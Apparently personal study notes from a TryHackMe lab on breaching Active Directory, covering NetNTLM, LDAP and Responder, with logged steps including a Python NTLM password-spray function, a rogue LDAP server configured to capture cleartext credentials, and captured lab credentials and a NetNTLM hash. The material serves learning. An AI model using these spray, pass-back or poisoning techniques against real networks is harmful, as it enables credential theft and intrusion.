#security 
# Terminology: 

---
# Generic Notes: 
- DNS will always be part of AD attacks because one of the two major AD authentication protocols, Kerberos, relies on DNS to create tickets
- Whenever you get caught up, always think `is my dns working?`
- NetNTLM (allows the application to play the role of a middle man between the client and AD) can be exposed to the network in various ways: 
  - Image of this process: ![[Screenshot 2024-11-01 at 11.20.00 AM.png]]
  - Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
  - Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
  - Exposed VPN endpoints that were integrated with AD.
  - Web applications that are internet-facing and make use of NetNTLM
- Once you gain AD Creds you can try to get in by doing a password spray attack where you try the same password for various users to try and log in. 
- Another form of authentication that can be used is LDAP (application directly verifies the user's credentials. The application has a pair of AD credentials that it can use first to query LDAP and then verify the AD user's credentials.) 
	- ![[Screenshot 2024-11-01 at 12.23.20 PM.png]]
	- popular mechanism with third-party (non-Microsoft) applications that integrate with AD
	- a service using LDAP authentication requires a set of AD credentials, it opens up additional attack avenues
	- LDAP Pass Back: a common attack against network devices, such as printers, when you have gained initial access to the internal network, such as plugging in a rogue device in a boardroom
- SMB: The Server Message Block (SMB) protocol allows clients (like workstations) to communicate with a server (like a file share). In networks that use Microsoft AD, SMB governs everything from inter-network file-sharing to remote administration
- Responder: allows us to perform Man-in-the-Middle attacks by poisoning the responses during NetNTLM authentication, tricking the client into talking to you instead of the actual server they wanted to connect to
	- On a real LAN, Responder will attempt to poison any  Link-Local Multicast Name Resolution (LLMNR),  NetBIOS Name Service (NBT-NS), and Web Proxy Auto-Discovery (WPAD) requests that are detected
	- although Responder would be able to intercept and poison more authentication requests when executed from our rogue device connected to the LAN of an organisation, it is crucial to understand that this behaviour can be disruptive and thus detected.
	- By poisoning authentication requests, normal network authentication attempts would fail, meaning users and services would not connect to the hosts and shares they intend to.


---
# Generic approach: 
- Gain access to AD Creds by: 
  1. OSINT 
  2. Phishing 

---
# Steps: 

1. Found ip by using `nslookup` in the attackbox to get the ip of the network 
2. Took note of the **breachad** network adapter: 
```
breachad: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.50.24.34  netmask 255.255.255.192  destination 10.50.24.34
        inet6 fe80::9418:eab6:50b3:3021  prefixlen 64  scopeid 0x20<link>
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 18  bytes 1181 (1.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28  bytes 1454 (1.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```
3. Ran this python script (this is just the primary function) with the parameters given in the script: 
```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```
4. Ended up getting creds using that script (found 4): 
```
[+] Valid credential pair found! Username: georgina.edwards Password: Changeme123
```
5. Afterwards we tried a different technique this time leveraging an attack vector on LDAP config by connecting to said printer and using ncat to mitm the request 
```
Connection from ip-10-200-26-201.eu-west-1.compute.internal 60409 received!
0\ufffdDc\ufffd;

x\ufffd
         objectclass0\ufffdsupportedCapabilities

0\ufffdP0\ufffdFc\ufffd=

x\ufffd
         objectclass0\ufffdsupportedSASLMechanisms^C

```

6. if the authentication method is too secure, the credentials will not be transmitted in cleartext, so we setup a rouge LDAP server here are the following steps 
   1. ran `sudo dpkg-reconfigure -p low slapd`  
   2. configured the domain name and organization to be `za.tryhackme.com` 
   3. set DB type to be MDB
   4. Made this config file:
		```
		#olcSaslSecProps.ldif dn: cn=config replace: olcSaslSecProps olcSaslSecProps: noanonymous,minssf=0,passcred
		```
   5. ran this command to patch LDAP server : 
		```
		sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif && sudo service slapd restart
		```

7. Afterwards we ran this command to listen to what the response of the website would be 
	```
	sudo tcpdump -SX -i breachad tcp port 389
	```
8. We got a password back which was `tryhackmeldappass1@` 
9. Setup Responder  and got this hash back: 
```
b44863245178c100:7C9A721639728CE0170B0C02BCEE876A:0101000000000000000D89209A2CDB01AF9351696FE0B8690000000002000800380044003000590001001E00570049004E002D00460032004C00510048003200460042005A003600470004003400570049004E002D00460032004C00510048003200460042005A00360047002E0038004400300059002E004C004F00430041004C000300140038004400300059002E004C004F00430041004C000500140038004400300059002E004C004F00430041004C0007000800000D89209A2CDB01060004000200000008003000300000000000000000000000002000001349E9E964C213B720BAAB6214E932D2C93F87BD845E816D0A9338B7D641B8B60A001000000000000000000000000000000000000900200063006900660073002F00310030002E00350030002E00320034002E00330034000000000000000000
```
10. 

